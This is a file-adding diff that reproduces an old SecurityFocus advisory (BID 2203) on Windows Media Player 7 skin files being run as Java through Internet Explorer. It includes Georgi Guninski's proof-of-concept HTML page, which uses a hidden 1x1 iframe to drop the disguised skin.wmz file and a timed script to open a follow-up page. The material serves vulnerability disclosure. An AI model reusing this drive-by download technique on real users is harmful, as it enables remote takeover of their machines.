@@ -1,0 +1,63 @@
+source: http://www.securityfocus.com/bid/2203/info
+
+A vulnerability has been reported in Microsoft Windows Media Player 7 which is exploitable through Internet Explorer and Java.
+
+Skins are downloadable files which change the appearance of a program's user interface. Skins for Windows Media Player are installed to a known location: "C:/Program files/Windows Media Player/Skins/skin.wmz".
+
+As a result, a remote HTML document, visited by the victim user, can lead the user's browser to download an arbitrary file matching the the name 'skin.wmz' to this known location.
+
+A malicious remote user could exploit this to upload a file containing executable java code disguised as a Windows Media Player skin file.
+
+An applet tag in the remote HTML document can then execute the 'skin.wmz' file as Java code. Properly exploited, this could provide an attacker with complete control of the vulnerable system. On multiuser Windows NT or 2000 systems, this vulnerability can only provide the attacker with access to the system that is within the security context of the user who was exploited. 
+
+<HTML>
+<HEAD>
+<TITLE>
+Windows Media Player 7 and IE java vulnerability - executing arbitrary programs
+</TITLE>
+</HEAD>
+<BODY>
+<H3>
+Windows Media Player 7 and IE java vulnerability - executing arbitrary programs
+</H3>
+<BR>
+<p>Legal Notice:
+<br>This Advisory and Demonstration is Copyright (c) 2000 Georgi Guninski. You may distribute
+it unmodified. You may not modify it and distribute it or distribute parts
+of it without the author's written permission.
+<p>Disclaimer:
+<br>The opinions expressed in this advisory and program are my own and
+not of any company.
+<br>The usual standard disclaimer applies, especially the fact that Georgi
+Guninski
+<br>is not liable for any damages caused by direct or&nbsp; indirect use
+of the information or functionality provided by this advisory or program.
+<br>Georgi Guninski, bears no responsibility for content or misuse of this
+advisory or program or any derivatives thereof.
+<BR>
+Read the <A HREF="wmp7-3-desc.html">Advisory</A> for more information.
+<BR>
+Wait a few seconds and a window will be opened.
+<BR>
+<IFRAME SRC="wmp2.wmz" WIDTH=1 HEIGHT=1></IFRAME>
+<SCRIPT>
+function f()
+{
+window.open("wmp7-3a.html");
+}
+setTimeout("f()",4000);
+</SCRIPT>
+<BR>
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
